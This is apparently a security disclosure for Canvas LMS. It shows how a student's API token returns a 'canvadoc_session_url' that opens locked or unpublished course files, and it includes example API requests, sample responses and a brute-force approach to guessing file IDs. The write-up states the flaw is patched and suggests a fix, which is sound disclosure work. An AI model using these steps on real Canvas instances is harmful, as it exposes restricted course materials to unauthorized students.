# Canvas File Oracle

**Important Notice**: This vulnerability has been patched as of 10/15/2022.

## Exploitation Summary

Our researcher has found that due to the absent file permission checking in the API, the value of `canvadoc_session_url` makes it possible for a `student` to view any uploaded files in a course the student has enrolled, even if the file *belongs to an unpublished module*, *is locked*, or *is locked and belongs to an unpublished module*.

## Core Vulnerability

* The **Access Token** generated by Canvas LMS behaves non-discriminatively for all roles.
  + `GET https://canvas.example.com/api/v1/courses/{COURSE_ID}/files/{FILE_ID}` always return a JSON object containing a valid `canvadoc_session_url` property when the owner of the **Access Token** is enrolled in the `{COURSE_ID}` and `{FILE_ID}` specifies a file in `{COURSE_ID}`.
* `canvadoc_session_url` from the JSON object behaves non-discriminatively for all roles.
  + For all roles (`teacher`, `TA`, `student`), `canvadoc_session_url` provides the path (301 redirects) to a DocViewer page. The DocView is believed to be used by Canvas by being loaded in an iframe.

## Exploitation

It would be trivial to create a bruteforce attack for a specific `{COURSE_ID}` to get the `{TARGET_FILE_ID}`:

```
GET https://canvas.example.com/api/v1/courses/{COURSE_ID}/files/{TARGET_FILE_ID}

```

by bruteforcing all possible `{TARGET_FILE_ID}` values. When the `{TARGET_FILE_ID}` is not exist, API returns:

```
{
  "errors": [
    {
      "message": "The specified resource does not exist."
    }
  ]
}

```

Otherwise, API returns an JSON object containing the detailed file info:

```
{
  "id": 153481443,
  "uuid": "VAfrXT0AGMUqmxfdMP90voq9hJCb0gOvOGQ9q4G4",

      "workflow_state": "unpublished",
      "deleted_at": null,
      "unlock_at": "2021-11-24T07:00:00Z",
      "migration_id": null,
      "require_sequential_progress": false,
      "cloned_item_id": null,
      "completion_events": null,
      "requirement_count": null,
      "root_account_id": 10
    },
    "unlock_at": "2021-11-24T07:00:00Z"
  },
  "lock_explanation": "This file is locked until Nov 24 at 12am.",
  "canvadoc_session_url": "/api/v1/canvadoc_session?blob=%7B%22user_id%22:70000032029297,%22attachment_id%22:153481443,%22type%22:%22canvadoc%22%7D&hmac=e423b38ecb275dca5f694e941ab1beaa4d03453d",
  "crocodoc_session_url": null
}

```

By appending `canvadoc_session_url` part to the hostname `https://canvas.examples.com`, we get something like

```
https://canvas.examples.com/api/v1/canvadoc_session?blob=%7B%22user_id%22:70000032029297,%22attachment_id%22:153481443,%22type%22:%22canvadoc%22%7D&hmac=e423b38ecb275dca5f694e941ab1beaa4d03453d

```

Which redirects to a DovViewer showing the contents of the file, even if the file is current `UNPUBLISHED` or even `LOCKED`.

## Attack Improvement

The attack efficiency could be greatly amplified if the attacker could make an educated guess for the `FileID`, which is `serialized` for each Canvas LMS instance installation.

| Disclaimer This is an active exploit and it might be actively utilized. I don't know if this is a proper place to file for it but I find no better place elsewhere after my email got no response in 1 month. I choose to publish it here during the summer break to minimizing the potential impact.  I would suggest publishing a `Security Advisories` to raise awareness if see fit. Summary: `canvadoc_session_url` could be exploited for unrestricted access to unpublished content. Steps to reproduce:  1. Get API access to Canvas as a student to a specific course. 2. [Optional] Bruteforce finding file ID for a specific course ID. For example: `https://canvas.myschool.edu/api/v1/courses/$CourseID/files/$FileID`    * This step could be optimized with knowledge of the approximate file ID range and/or the keyword in the filename. 3. Access `canvadoc_session_url` in the JSON object returned by the API.  Expected behavior: The `canvadoc_session_url` should deny access for whoever logged in Canvas as a student if the file is not published. Actual behavior: Access to locked/unpublished files is granted to students via `canvadoc_session_url`. The student will be redirected to a DocViewer under `https://canvadocs.instructure.com/` Additional notes: This exploited might already be fixed in a new version. But please understand different institutions might not be using the same up-to-date version of Canvas as I clearly see different access verification levels from different institutions. If that is the case, please kindly notify users to update to a minimal version with a feasible fix.  Otherwise, proper permission checking for `/api/v1/canvadoc_session` should be easy to implement and enforce.  Credits go to [@yl4579](https://github.com/yl4579) for realizing this potential exploit in a tea-time discussion with me. |
